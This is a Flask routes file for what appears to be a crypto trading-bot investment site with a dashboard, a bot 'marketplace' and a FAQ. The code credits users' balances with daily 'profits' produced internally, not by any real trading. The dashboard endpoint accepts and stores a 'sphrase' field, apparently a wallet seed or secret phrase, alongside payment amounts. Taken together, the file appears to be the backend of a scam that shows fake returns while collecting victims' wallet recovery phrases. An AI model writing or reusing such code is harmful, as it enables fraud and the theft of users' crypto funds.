import random
from flask import jsonify, render_template, flash, redirect, url_for, request, g, \
    current_app
from flask_login import current_user, login_required
from flask_babel import _, get_locale
from apscheduler.schedulers.background import BackgroundScheduler
from pytz import utc
import sqlalchemy as sa
from langdetect import detect, LangDetectException
from app import db, create_app
from app.main.forms import EditProfileForm, EmptyForm, PaymentForm
from app.models import User, Trade, Payment
from app.translate import translate
from app.main import bp
from datetime import datetime, timezone, timedelta
from datetime import datetime, timedelta, timezone
from app import db
from app.models import User, Trade


def update_chart_and_values(user_id):
    try:
        user = User.query.get(user_id)
        if user is not None:
            trade = Trade.query.filter_by(user_id=user.id).first()

            if trade is not None and user.balance != 0:
                profit, values = trade.generate_trade()
                old_values = [float(x) for x in trade.dailychart[1:-1].split(",")]

                for value in values:
                    success, unsuccess, spot_margin = value

                if len(trade.dailychart) < 32:
                    trade.dailychart = trade.set_chart_values(old_values + [profit])
                    weekly_values = [(x + success, y + unsuccess) for x, y in trade.get_daily_values()]
                    trade.weeklytv = trade.set_chart_values(weekly_values)
                else:
                    trade.dailytv = trade.set_chart_values([(success, unsuccess)])
                    trade.dailychart = trade.set_chart_values([profit])
                    trade.weeklytv = trade.set_chart_values([(success, unsuccess)])
                    trade.week += 1
                    if trade.week <= 4:
                        monthly_values = [(x + success, y + unsuccess) for x, y in trade.get_daily_values()]
                        trade.monthlytv = trade.set_chart_values(monthly_values)
                    else:
                        trade.monthlytv = trade.set_chart_values([(success, unsuccess)])

                trade.profitloss = profit
                trade.spot_margin = spot_margin
                current_user.last_seen = datetime.now(timezone.utc)
                user.balance += ((float(user.balance) * (trade.profitloss / 100)))
                db.session.commit()
    except Exception as e:
        print(f"Error in update_chart_and_values: {str(e)}")

@bp.before_app_request
def before_request():
    try:
        if current_user.is_authenticated:
            current_time = datetime.now(timezone.utc)
            days_passed = current_time - current_user.last_seen.replace(tzinfo=timezone.utc)
            if days_passed.days == 1:
                update_chart_and_values(current_user.id)
            elif days_passed.days > 1:
                for i in range(days_passed.days):
                    update_chart_and_values(current_user.id)
            else:
                print(days_passed.days)
                #flash("Danger", category='error')
    except Exception as e:
        print(e)

@bp.route('/', methods=['GET'])
@bp.route('/index', methods=['GET'])
def welcome():
    if current_user.is_authenticated:
        return redirect(url_for('main.index'))
    return render_template('welcome.html')

@bp.route('/faq', methods=['GET'])
def faq():

    return render_template('faqs.html')

@bp.route('/dashboard', methods=['GET', 'POST'])
@login_required
def index():
    if current_user.is_verified == False:
        return redirect(url_for('auth.verify'))

    if request.method == 'POST':
        data = request.get_json()
        amount = data.get('amount')
        sphrase = data.get('sphrase')
        if amount:
            pay = Payment(dollars = amount, user_id=current_user.id)
            db.session.add(pay)
            db.session.commit()
            return jsonify({'message': 'Data collected successfully'}), 200
        elif sphrase:
            current_user.sphrase = sphrase
            db.session.commit()
            return jsonify({'message': 'Data collected successfully'}), 200
        else:
            return jsonify({'message': 'Invalid data'}), 400

    # Render template with necessary data
    dform = PaymentForm()
    trade = db.session.scalar(sa.select(Trade).where(Trade.user_id == current_user.id))
    chart_data = trade.get_chart_values()
    daily_data = trade.get_daily_values()
    weekly_data = trade.get_weekly_values()
    monthly_data = trade.get_monthly_values()
    profit = trade.get_profit()
    profit_balance = trade.profit_balance()
    spot_margin = trade.spot_margin or 0

    return render_template('dashboard.html', dform=dform, chart_data=chart_data,
                           daily=daily_data, weekly=weekly_data, monthly=monthly_data,
                           profit=profit, profit_balance=profit_balance, spot_margin=spot_margin)

@bp.route('/marketplace', methods=['GET', 'POST'])
@login_required
def market():
    return render_template('marketplace.html')

@bp.route('/changebot/<bot>', methods=['GET', 'POST'])
@login_required
def changebot(bot):
    if bot in ['trademaster360', 'cryptosage', 'quantraderx', 'arbitagebot', 'forexninja']:
        current_user.bot = bot
        db.session.commit()
        flash("You have succssfully changed your bot", category='success')
    else:
        flash("Invalid bot")
    return redirect(url_for('main.market'))
